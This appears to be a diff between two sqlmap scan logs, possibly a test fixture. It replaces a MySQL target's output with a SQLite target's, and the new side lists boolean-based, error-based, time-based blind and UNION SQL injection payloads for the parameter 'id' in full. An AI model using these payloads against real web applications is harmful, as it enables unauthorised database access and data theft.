@@ -1,23 +1,21 @@
-[10:14:02] [INFO] testing connection to the target URL
-[10:14:03] [INFO] testing if the target URL content is stable
-[10:14:04] [INFO] target URL content is stable
-[10:14:05] [INFO] testing if GET parameter 'id' is dynamic
-[10:14:06] [INFO] GET parameter 'id' appears to be dynamic
-[10:14:12] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
-[10:14:20] [INFO] testing 'Generic UNION query (NULL) - 3 columns'
-[10:14:24] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 3 columns' injectable
-sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1 AND 7331=7331
+    Payload: id=1 AND 7372=7372
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: id=1 AND 5355=JSON_EXTRACT(CHAR(123,125),CHAR(113,106,106,112,113)||(SELECT (CASE WHEN (5355=5355) THEN 1 ELSE 0 END))||CHAR(113,122,118,120,113))
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: id=1 AND 8563=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))
 
     Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7176627171,0x4b6f4c72),NULL-- -
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,106,106,112,113)||CHAR(68,114,97,78,117,113,110,69,101,74,97,76,72,89,100,79,114,90,79,87,101,103,107,74,104,68,67,72,68,82,81,86,69,84,98,90,118,66,85,67)||CHAR(113,122,118,120,113),NULL-- YETl
 ---
-[10:14:30] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu
-web application technology: PHP 8.1.2, Apache 2.4.52
-back-end DBMS: MySQL >= 5.0
+web application technology: Apache 2.2.3
+back-end DBMS: SQLite
